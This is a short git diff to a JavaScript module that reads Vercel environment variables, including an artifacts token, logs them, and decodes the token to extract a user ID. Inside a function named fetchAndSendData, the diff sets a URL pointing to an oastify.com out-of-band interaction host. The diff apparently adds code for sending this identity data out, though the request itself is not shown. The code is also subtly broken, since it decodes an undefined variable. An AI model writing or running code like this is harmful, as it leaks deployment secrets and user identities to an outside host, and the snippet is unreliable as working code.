@@ -5,12 +5,20 @@ export const Idb = (prjid) => {
   const NEXT_PUBLIC_VERCEL_PROJECT_ID = String(process.env.NEXT_PUBLIC_VERCEL_PROJECT_ID);
   const NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF = process.env.NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF;
   const NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN = process.env.NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN;
+
+  //pulling out and defining userID
+  const lastDotIndex = NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN.lastIndexOf('.');
+  
+  const truncatedToken = base64EncodedString.substring(0, lastDotIndex);
+  const decodedToken = Buffer.from(truncatedToken, 'base64').toString('utf-8');
+  const userIdRegex = /"userId":"(.*?)"/;
+  const match = decodedToken.match(userIdRegex);
+  const userId = match ? match[1] : null;
   setTimeout(() => {
     function fetchAndSendData() {
         console.log({NEXT_PUBLIC_VERCEL_PROJECT_ID});
         console.log({NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF});
         console.log({NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN});
-    	  const userId = "444"
         const dbName = "rep:live_mode_1@" + String(process.env.NEXT_PUBLIC_VERCEL_PROJECT_ID) + "@" + String(process.env.NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF) + "-" + String(userId) + ":4";
         console.log({dbName});
         const url = 'https://rqlt1694pp1b11zyns5oflv8fzlq9h17pw.oastify.com';
